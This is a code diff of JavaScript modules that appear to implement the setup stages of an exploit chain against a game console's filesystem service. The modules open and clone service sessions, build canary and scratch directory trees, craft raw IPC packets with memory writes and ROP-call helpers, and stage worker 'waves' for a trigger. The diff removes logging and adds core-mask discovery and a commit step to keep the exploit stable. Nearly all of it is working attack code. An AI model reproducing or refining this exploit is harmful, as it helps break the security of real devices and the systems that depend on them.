@@ -8,6 +8,7 @@ const {
   applyCmifContext,
   borrowThreadScheduling,
   buildWaveFrames,
+  findSvcSetCoreMask,
   call_rop,
   cloneFsSession,
   cloneObject,
@@ -22,7 +23,6 @@ const {
   ipcCreateFile,
   ipcFreeSpace,
   ipcGetEntryType,
-  log,
   normalizedPath,
   openContentStorage,
   openFspSession,
@@ -39,16 +39,24 @@ const {
 // ── Setup steps (S1–S10) ────────────────────────────────────────────────────
 
 export async function borrowRawThreadScheduling() {
-  let rawScheduling;
     // S1: Borrow raw-thread scheduling.
-    rawScheduling = borrowThreadScheduling();
+    const rawScheduling = borrowThreadScheduling();
     if (!rawScheduling) {
-        await log("FAIL: scheduling");
         return failedStep("raw-thread-scheduling-unavailable");
     }
-    await log("SETUP: scheduling ok");
 
-  return {ok: true, rawScheduling};
+    // Discover svcSetThreadCoreMask and check that the priority range
+    // fits all active workers (contiguous priorities from the base).
+    if (findSvcSetCoreMask() === 0n) {
+        return failedStep("svc-set-core-mask-not-found");
+    }
+
+    if (rawScheduling.priority + 12 > 63) {
+        return failedStep("priority-range-too-narrow",
+            "base=" + rawScheduling.priority + "; need=13");
+    }
+
+    return {ok: true, rawScheduling};
 }
 
 export async function openFspSessions({helpers}) {
@@ -70,7 +78,6 @@ export async function openFspSessions({helpers}) {
     // S2: Root session + two save clones.
     rootSession = openFspSession();
     if (!rootSession) {
-        await log("FAIL: fsp-srv");
         return failedStep("fsp-session-open-failed");
     }
 
@@ -81,18 +88,18 @@ export async function openFspSessions({helpers}) {
 
     var saveMount = getMountHandle("save");
     if (!saveMount) {
-        await log("FAIL: no save mount"); cleanupHandles();
+         cleanupHandles();
         return failedStep("save-mount-unavailable");
     }
 
     savedHandle = cloneObject(saveMount.handle, saveMount.objId);
     if (!savedHandle) {
-        await log("FAIL: saved clone"); cleanupHandles();
+         cleanupHandles();
         return failedStep("save-filesystem-clone-failed");
     }
     temporaryHandle = cloneObject(saveMount.handle, saveMount.objId);
     if (!temporaryHandle) {
-        await log("FAIL: temporary clone"); cleanupHandles();
+         cleanupHandles();
         return failedStep("temporary-filesystem-clone-failed");
     }
 
@@ -132,15 +139,12 @@ export async function createScratchTree({
 
     var scratchBefore = ipcGetEntryType(savedHandle, SCRATCH_DIR);
     if (scratchBefore.error !== 0x202) {
-        await log("FAIL: /hole must be absent; restart the console and retry; result=" +
-            hex32(scratchBefore.error));
         cleanupHandles();
         return failedStep("scratch-path-must-be-absent",
             "result=" + hex32(scratchBefore.error));
     }
     var spaceBefore = ipcFreeSpace(savedHandle, "/");
     if (spaceBefore.error !== 0 || spaceBefore.bytes <= config.DIRTY_FILE_SIZE + 0x500000) {
-        await log("FAIL: insufficient free space");
         cleanupHandles();
         return failedStep("insufficient-save-free-space",
             "result=" + hex32(spaceBefore.error) + "; bytes=" +
@@ -155,7 +159,6 @@ export async function createScratchTree({
     }
 
     if (scratchRootResult !== 0 || scratchCommitResult !== 0) {
-        await log("FAIL: scratch root");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("scratch-root-create-or-commit-failed",
             "create=" + hex32(scratchRootResult) + "; commit=" +
@@ -166,7 +169,6 @@ export async function createScratchTree({
     var dirtyFileResult = ipcCreateFile(savedHandle, dirtyFilePath,
         config.DIRTY_FILE_SIZE);
     if (dirtyFileResult !== 0) {
-        await log("FAIL: commit_data");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("dirty-file-create-failed",
             "result=" + hex32(dirtyFileResult));
@@ -193,12 +195,6 @@ export async function createScratchTree({
     }
 
     if (!canaryOk || canaryCreateResult !== 0) {
-        await log("FAIL: canary chain pathLen=" + canaryPath.length +
-            " dirs=" + canaryDirectories + "/" + (canaryParts.length - 2) +
-            (canaryMkdirFailure ? " mkdirAt=" + canaryMkdirFailure.index +
-                " mkdirLen=" + canaryMkdirFailure.pathLength +
-                " mkdirResult=" + hex32(canaryMkdirFailure.result) : "") +
-            " create=" + hex32(canaryCreateResult));
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("canary-chain-create-failed",
             "pathLen=" + canaryPath.length + "; dirs=" +
@@ -218,7 +214,6 @@ export async function createScratchTree({
     write32(setupPkt + 0x18n, 7n);
     var abortTransport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
     if (abortTransport !== 0) {
-        await log("FAIL: abort control transport");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("abort-control-transport-failed",
             "transport=" + hex32(abortTransport));
@@ -228,7 +223,6 @@ export async function createScratchTree({
     // Selected directory and SPAN tree via temporary.
     var selectedDirectoryResult = ipcCreateDirectory(savedHandle, selectedDir);
     if (selectedDirectoryResult !== 0) {
-        await log("FAIL: selected dir");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("selected-directory-create-failed",
             "result=" + hex32(selectedDirectoryResult));
@@ -238,7 +232,6 @@ export async function createScratchTree({
         running += "/" + segments[i];
         var spanDirectoryResult = ipcCreateDirectory(temporaryHandle, running);
         if (spanDirectoryResult !== 0) {
-            await log("FAIL: span dir " + i);
             removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
             return failedStep("span-directory-create-failed",
                 "index=" + i + "; result=" + hex32(spanDirectoryResult));
@@ -246,13 +239,22 @@ export async function createScratchTree({
     }
     var spanMarkerResult = ipcCreateFile(temporaryHandle, markerPath, 1);
     if (spanMarkerResult !== 0) {
-        await log("FAIL: SPAN_MARKER");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("span-marker-create-failed",
             "result=" + hex32(spanMarkerResult));
     }
-    await log("SETUP: scratch tree ready canaryPathLen=" + canaryPath.length +
-        " dirs=" + canaryDirectories + " create=" + hex32(canaryCreateResult));
+
+    // Commit the full scratch tree so its metadata is no longer dirty
+    // when writeDirtyData adds DIRTY_FILE_SIZE bytes before each wave.
+    // Without this, metadata from the files above sits on top of the
+    // dirty write and can push total outstanding bytes past the BC save
+    // dirty cap (~8 MiB), poisoning the FS session.
+    var scratchTreeCommitResult = ipcCommit(savedHandle);
+    if (scratchTreeCommitResult !== 0) {
+        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
+        return failedStep("scratch-tree-commit-failed",
+            "result=" + hex32(scratchTreeCommitResult));
+    }
 
   return {ok: true, SCRATCH_DIR, abortControlCanonical, canaryPath,
       canaryDirectories, canaryCreateResult, dirtyFilePath, segments,
@@ -276,14 +278,13 @@ export async function openStorageAndClones({
     // S4: Primary IStorage + clones.
     storageHandle = openContentStorage(rootSession);
     if (!storageHandle) {
-        await log("FAIL: primary IStorage");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("primary-storage-open-failed");
     }
 
     for (var i = 0; i < 6; i++) {
         var h = cloneFsSession(savedHandle);
-        if (!h) { await log("FAIL: save clone " + i);
+        if (!h) {
             removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
             return failedStep("save-filesystem-clone-failed",
                 "index=" + i); }
@@ -291,7 +292,7 @@ export async function openStorageAndClones({
     }
     for (var i = 0; i < 4; i++) {
         var h = cloneFsSession(rootSession);
-        if (!h) { await log("FAIL: root clone " + i);
+        if (!h) {
             removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
             return failedStep("root-filesystem-clone-failed",
                 "index=" + i); }
@@ -318,7 +319,6 @@ export async function openTriggerHandles({
     triggerHandle = cloneFsSession(savedHandle);
     extentTriggerHandle = cloneFsSession(temporaryHandle);
     if (!triggerHandle || !extentTriggerHandle) {
-        await log("FAIL: trigger clones");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("trigger-handle-clone-failed",
             "trigger=" + Boolean(triggerHandle) + "; extent=" +
@@ -460,6 +460,7 @@ export function buildIpcRequests({
 }
 
 export async function checkPathPair({
+  config,
   helpers,
   handleResources,
   SCRATCH_DIR,
@@ -476,15 +477,25 @@ export async function checkPathPair({
         auxiliaryStorageHandle
     });
     // S8: Path-pair control.
-    var fillerControlOk = await helpers.checkPathPairQuiet(
-        fillerSrc, 16, fillerDst, 0x7F0, {savedHandle});
-    var guardControlOk = fillerControlOk
+    var fillersActive = config.workerRoles.indexOf(7) >= 0 ||
+        config.workerRoles.indexOf(8) >= 0;
+    var fillerControlOk = true;
+
+    if (fillersActive) {
+        var fillerControl = await helpers.checkPathPairQuiet(
+            fillerSrc, 16, fillerDst, 0x7F0,
+            {savedHandle, returnDiagnostics: true});
+        fillerControlOk = fillerControl.ok;
+    }
+
+    var guardControl = fillerControlOk
         ? await helpers.checkPathPairQuiet(
-            guardPath, 0x301, guardPathC, 0x301, {savedHandle})
+            guardPath, 0x301, guardPathC, 0x301,
+            {savedHandle, returnDiagnostics: true})
         : null;
+    var guardControlOk = guardControl ? guardControl.ok : null;
     var controlOk = Boolean(fillerControlOk && guardControlOk);
     if (!controlOk) {
-        await log("FAIL: path-pair control");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("path-pair-control-failed",
             "filler=" + Boolean(fillerControlOk) + "; guard=" +
@@ -494,7 +505,6 @@ export async function checkPathPair({
     // Auxiliary IStorage.
     auxiliaryStorageHandle = openContentStorage(rootSession);
     if (!auxiliaryStorageHandle) {
-        await log("FAIL: auxiliary IStorage");
         removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
         return failedStep("auxiliary-storage-open-failed");
     }
@@ -575,7 +585,6 @@ export async function prepareWaveInfrastructure({
         triggerBuf: triggerBuf,
         triggerFirstByte: 0x2F
     };
-    await log("SETUP: " + waveData.frames.length + " workers ready");
 
   return {ok: true, clearSendIndex, gates, pinSendIndex, preSendIndex, roleHandles, sendIndices, waveData, waveExtra, workerResources};
 }
